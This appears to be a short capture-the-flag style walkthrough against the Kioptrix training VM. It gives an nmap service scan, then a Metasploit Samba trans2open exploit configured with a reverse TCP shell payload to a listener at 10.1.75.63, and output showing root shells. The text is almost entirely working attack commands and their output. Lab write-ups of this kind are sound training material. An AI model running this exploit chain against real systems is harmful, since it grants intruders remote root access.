Nmap scanning:

~~~
nmap 10.1.75.228 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 08:59 EDT
Nmap scan report for 10.1.75.228
Host is up (0.026s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)
|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)
|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2023-08-03T16:59:31+00:00; +3h59m53s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
32768/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: 3h59m52s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
~~~


~~~

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.1.75.228      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.75.63       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

~~~


~~~
msf6 exploit(linux/samba/trans2open) > set payload 33
payload => linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 10.1.75.63:4444 
[*] 10.1.75.228:139 - Trying return address 0xbffffdfc...
[*] 10.1.75.228:139 - Trying return address 0xbffffcfc...
[*] 10.1.75.228:139 - Trying return address 0xbffffbfc...
[*] 10.1.75.228:139 - Trying return address 0xbffffafc...
[*] 10.1.75.228:139 - Trying return address 0xbffff9fc...
[*] 10.1.75.228:139 - Trying return address 0xbffff8fc...
[*] 10.1.75.228:139 - Trying return address 0xbffff7fc...
[*] 10.1.75.228:139 - Trying return address 0xbffff6fc...
[*] Command shell session 9 opened (10.1.75.63:4444 -> 10.1.75.228:32837) at 2023-08-04 15:08:06 -0400

[*] Command shell session 10 opened (10.1.75.63:4444 -> 10.1.75.228:32838) at 2023-08-04 15:08:07 -0400
[*] Command shell session 11 opened (10.1.75.63:4444 -> 10.1.75.228:32839) at 2023-08-04 15:08:09 -0400
[*] Command shell session 12 opened (10.1.75.63:4444 -> 10.1.75.228:32840) at 2023-08-04 15:08:10 -0400
id
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
~~~


